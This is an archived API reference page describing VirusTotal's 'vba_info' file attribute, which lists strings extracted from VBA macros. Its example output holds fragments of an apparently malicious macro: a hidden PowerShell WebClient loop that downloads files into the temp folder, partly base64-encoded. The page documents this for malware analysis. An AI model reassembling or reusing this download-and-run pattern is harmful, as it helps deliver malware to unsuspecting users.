---
title: "vba_info"
source: https://gtidocs.virustotal.com/reference/file-object-vba-info
slug: file-object-vba-info
section: reference
group: "API OBJECTS"
updatedAt: 2025-09-25T00:42:00.000Z
retrieved: 2026-09-01
---

[gtidocs](../../../README.md) › [API Reference](../../README.md) › [API OBJECTS](../README.md) › [Files](../file-object.md) › vba_info

---

# vba_info

VBA macros information

`vba_info` returns parsed data from [VBA](https://docs.microsoft.com/en-us/office/vba/api/overview/) scripts.

* `deobfuscated_strings`: <*list of strings*> contains a concatenation of found obfuscated strings.
* `strings`: <*list of strings*> found strings having a length higher than two.

```json VBA files
{
  "data": {
        ...
    "attributes" : {
      ...
      "vba_info": {
        "deobfuscated_strings": ["<string>"],
        "strings": ["<string>"]
      }
    }
  }
}
```
```json Example
{
    "data": {
        "attributes": {
                "vba_info": {
                    "deobfuscated_strings": [
                        "65.665.69.66",
                        "/troll.jpg'.Split(',');$nam",
                        "exe';foreach($url in $urls){try{$webclient.DownloadFile($",
                        "pt.Shell;$webclient = new-object System.Net.WebClient;$rando"
                    ],
                    "strings": [
                        "uX6b35Nv",
                        "FtzPcp",
                        "tG45B",
                        "T8YIS42Q",
                        "cHQuU2hlbGw7JHdlYmNsaWVudCA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHJhbmRv",
                        "exe';foreach($url in $urls){try{$webclient.DownloadFile($",
                        "F9UOD3Aax",
                        "xmYL1",
                        "fJN29dWy",
                        "rSX1Tg",
                        "/troll.jpg'.Split(',');$nam",
                        "nfjWE2qSZ",
                        "ZXhlJztmb3JlYWNoKCR1cmwgaW4gJHVybHMpe3RyeXskd2ViY2xpZW50LkRvd25sb2FkRmlsZSgk",
                        "hm7IJ4Z",
                        "d29jxG0Bz",
                        "erQZU9yb",
                        "eNOGeJHPa",
                        "BIc1t7xz",
                        "2NyaXB0ID0gbmV3LW9iamVjdCAtQ29tT2JqZWN0IFdTY3Jp",
                        "dXJsLlRvU3RyaW5nKC",
                        "cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuICR3c",
                        "DaCpB",
                        "mz97ZruME",
                        "gCtLPQSu",
                        "b49eLOd",
                        "pt.Shell;$webclient = new-object System.Net.WebClient;$rando",
                        "f4tJdNRj9",
                        "pFE9BvIRC",
                        "bTiBr9CJ",
                        "QzAPSsl2",
                        "tjS419xv",
                        "vLvgYGn3a",
                        "V4dCgxLCA2NTUzNik7JHBhdGggPSAkZW52OnRlbXAgKyAnXCcgKyAkbmFtZSArICcu",
                        "ACBkJu",
                        "s3uj2",
                        "E5blD1xIz",
                        "VHYd0",
                        "65.665.69.66",
                        "eD8uCJ",
                        "y8kUqwr",
                    ]
                },
            }
        }
    }
```

---

← [wireshark](file-object-wireshark.md) · [up](../README.md) · [🔀 compressed_parents](file-object-compressed-parents.md) →

*Archived from <https://gtidocs.virustotal.com/reference/file-object-vba-info>.*
